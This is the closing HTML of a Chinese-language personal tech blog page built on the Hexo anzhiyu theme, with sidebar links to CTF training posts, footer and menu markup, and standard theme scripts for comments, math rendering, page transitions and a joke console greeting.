href="/DevCorner/%E4%B8%8D%E6%87%82%E5%B0%B1%E5%95%8F%EF%BC%81%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8-Hexo-GitHub-HackMD-%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%80%8B%E4%BA%BA%E9%83%A8%E8%90%BD%E6%A0%BC/" title="不懂就問！如何利用 Hexo + GitHub + HackMD 搭建自己的個人部落格">不懂就問！如何利用 Hexo + GitHub + HackMD 搭建自己的個人部落格</a><time datetime="2024-06-29T18:39:53.000Z" title="發表於 2024-06-30 02:39:53">2024-06-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024%20CTF%20Training/Day-04-Grinding-PicoCTF-2/" title="[Day 04] Grinding PicoCTF 2"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/images/hacker_in_the_universe.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[Day 04] Grinding PicoCTF 2"/></a><div class="content"><a class="title" href="/2024%20CTF%20Training/Day-04-Grinding-PicoCTF-2/" title="[Day 04] Grinding PicoCTF 2">[Day 04] Grinding PicoCTF 2</a><time datetime="2024-06-29T08:44:33.000Z" title="發表於 2024-06-29 16:44:33">2024-06-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024%20CTF%20Training/Day-03-Learning-Cryptography-2/" title="[Day 03] Learning Cryptography 2"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/images/hacker_in_the_universe.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[Day 03] Learning Cryptography 2"/></a><div class="content"><a class="title" href="/2024%20CTF%20Training/Day-03-Learning-Cryptography-2/" title="[Day 03] Learning Cryptography 2">[Day 03] Learning Cryptography 2</a><time datetime="2024-06-28T09:16:17.000Z" title="發表於 2024-06-28 17:16:17">2024-06-28</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="footer_deal"><a class="deal_link" href="mailto:timchen975@gmail.com" title="Email"><i class="fa-solid fa-envelope"></i></a><a class="deal_link" target="_blank" rel="noopener" href="https://www.facebook.com/profile.php?id=100011698690769" title="Facebook"><i class="fa-brands fa-facebook"></i></a><a class="deal_link" target="_blank" rel="noopener" href="https://github.com/CX330Blake" title="GitHub"><i class="fa-brands fa-github"></i></a><img class="footer_mini_logo" title="返回顶部" alt="返回顶部" onclick="anzhiyu.scrollToDest(0, 500)" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/me.jpg" size="50px"/><a class="deal_link" target="_blank" rel="noopener" href="https://www.linkedin.com/in/%E5%AD%90%E9%9B%8B-%E9%99%B3-11087825b/" title="LinkedIn"><i class="fa-brands fa-linkedin-in"></i></a><a class="deal_link" target="_blank" rel="noopener" href="https://discord.com/users/718263896187732049" title="Discord"><i class="fa-brands fa-discord"></i></a><a class="deal_link" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.en" title="CC"><i class="fa-regular fa-copyright"></i></a></div></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2024 By <a class="footer-bar-link" href="/" title="CX330" target="_blank">CX330</a></div></div><div id="footer-type-tips"></div><div class="js-pjax"><script>function subtitleType () {
+  if (true) { 
+    window.typed = new Typed("#footer-type-tips", {
+      strings: ["Build the universe with me","Hack the planet!"],
+      startDelay: 300,
+      typeSpeed: 200,
+      loop: true,
+      backSpeed: 50
+    })
+  } else {
+    document.getElementById("footer-type-tips").innerHTML = 'Build the universe with me'
+  }
+}
+
+if (true) {
+  if (typeof Typed === 'function') {
+    subtitleType()
+  } else {
+    getScript('https://cdn.cbd.int/typed.js@2.1.0/dist/typed.umd.js').then(subtitleType)
+  }
+} else {
+  subtitleType()
+}</script></div></div><div class="footer-bar-right"><a class="footer-bar-link" href="https://cx330.tw/subscribe" title="Subscribe">Subscribe</a><a class="footer-bar-link cc" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.en" title="cc协议"><i class="anzhiyufont anzhiyu-icon-copyright-line"></i><i class="anzhiyufont anzhiyu-icon-creative-commons-by-line"></i><i class="anzhiyufont anzhiyu-icon-creative-commons-nc-line"></i><i class="anzhiyufont anzhiyu-icon-creative-commons-nd-line"></i></a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/" title="tag"><div class="headline">標籤</div><div class="length-num">16</div></a><a href="/categories/" title="category"><div class="headline">分類</div><div class="length-num">5</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="顯示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>顯示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">聯絡</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://www.facebook.com/profile.php?id=100011698690769" title="Facebook"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/fb.png" alt="Facebook"/><span class="back-menu-item-text">Facebook</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://www.linkedin.com/in/%E5%AD%90%E9%9B%8B-%E9%99%B3-11087825b/" title="LinkedIn"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/linkedin.png" alt="LinkedIn"/><span class="back-menu-item-text">LinkedIn</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">English site</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://en.cx330.tw" title="CX330's Universe"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/me.jpg" alt="CX330's Universe"/><span class="back-menu-item-text">CX330's Universe</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> Articles</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-list-ul faa-tada" style="font-size: 0.9em;"></i><span> Tree</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> Categories</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> Tags</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> Friends</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> Sites</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-message faa-tada" style="font-size: 0.9em;"></i><span> Message board</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> My</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/?id=7032963191&amp;server=netease"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> Music Hall</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> Moments</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-book faa-tada" style="font-size: 0.9em;"></i><span> Chasing</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> Album Set</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> About</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> Me</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-dice faa-tada" style="font-size: 0.9em;"></i><span> Random</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/30%E5%A4%A9%E8%A8%88%E7%95%AB/" style="font-size: 0.88rem;">30天計畫<sup>6</sup></a><a href="/tags/AI/" style="font-size: 0.88rem;">AI<sup>1</sup></a><a href="/tags/AIS3/" style="font-size: 0.88rem;">AIS3<sup>1</sup></a><a href="/tags/Blog/" style="font-size: 0.88rem;">Blog<sup>1</sup></a><a href="/tags/CTF/" style="font-size: 0.88rem;">CTF<sup>8</sup></a><a href="/tags/Crypto/" style="font-size: 0.88rem;">Crypto<sup>3</sup></a><a href="/tags/Cryptography/" style="font-size: 0.88rem;">Cryptography<sup>2</sup></a><a href="/tags/CyberSec/" style="font-size: 0.88rem;">CyberSec<sup>6</sup></a><a href="/tags/GDSC/" style="font-size: 0.88rem;">GDSC<sup>1</sup></a><a href="/tags/PicoCTF/" style="font-size: 0.88rem;">PicoCTF<sup>5</sup></a><a href="/tags/SCIST/" style="font-size: 0.88rem;">SCIST<sup>1</sup></a><a href="/tags/Security/" style="font-size: 0.88rem;">Security<sup>1</sup></a><a href="/tags/%E5%AF%86%E7%A2%BC%E5%AD%B8/" style="font-size: 0.88rem;">密碼學<sup>1</sup></a><a href="/tags/%E7%AD%86%E8%A8%98/" style="font-size: 0.88rem;">筆記<sup>1</sup></a><a href="/tags/%E7%B6%B2%E9%A0%81%E9%96%8B%E7%99%BC/" style="font-size: 0.88rem;">網頁開發<sup>1</sup></a><a href="/tags/%E8%B3%87%E5%AE%89/" style="font-size: 0.88rem;">資安<sup>4</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="閱讀模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="簡繁轉換">简</button><button id="darkmode" type="button" title="淺色和深色模式轉換"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="單欄和雙欄切換"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="設定"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目錄"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直達評論"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到頂部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="7032963191" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜尋</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  資料庫載入中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜尋文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://music.163.com/playlist?id=7032963191&amp;userid=6279304773&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>转为简体</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.cbd.int/pangu@4.0.7/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("05/28/2024 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2024 By 安知鱼 V1.6.12",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 CX330 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.1
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, '']
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.cbd.int/mathjax@3.2.2/es5/tex-mml-chtml.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typesetPromise()
+}</script><script>(() => {
+  const initWaline = () => {
+    const waline = Waline.init(Object.assign({
+      el: '#waline-wrap',
+      serverURL: 'https://comment.cx330.tw',
+      pageview: true,
+      dark: 'html[data-theme="dark"]',
+      path: window.location.pathname,
+      comment: false,
+    }, null))
+  }
+
+  const loadWaline = async () => {
+    if (typeof Waline === 'object') initWaline()
+    else {
+      await getCSS('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.css')
+      await getScript('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.js')
+      initWaline()
+    }
+  }
+
+  if ('Waline' === 'Waline' || !false) {
+    if (false) anzhiyu.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
+  const changeContent = content => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[圖片]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[連結]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[程式碼]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'data-lazy-src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
+        }
+
+        result += `<div class='content'>
+        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
+        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
+        </div></div>`
+      }
+    } else {
+      result += '沒有評論'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom && ($dom.innerHTML= result)
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const getComment = async () => {
+    try {
+      const res = await fetch('https://comment.cx330.tw/api/comment?type=recent&count=6', { method: 'GET' })
+      const result = await res.json()
+      const walineArray = result.data.map(e => {
+        return {
+          'content': changeContent(e.comment),
+          'avatar': e.avatar,
+          'nick': e.nick,
+          'url': e.url + '#' + e.objectId,
+          'date': e.time || e.insertedAt
+        }
+      })
+      saveToLocal.set('waline-newest-comments', JSON.stringify(walineArray), 10/(60*24))
+      generateHtml(walineArray)
+    } catch (err) {
+      console.error(err)
+      const $dom = document.querySelector('#card-newest-comments .aside-list')
+      $dom.textContent= "無法獲取評論，請確認相關配置是否正確"
+    }
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('waline-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><script>var visitorMail = "";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
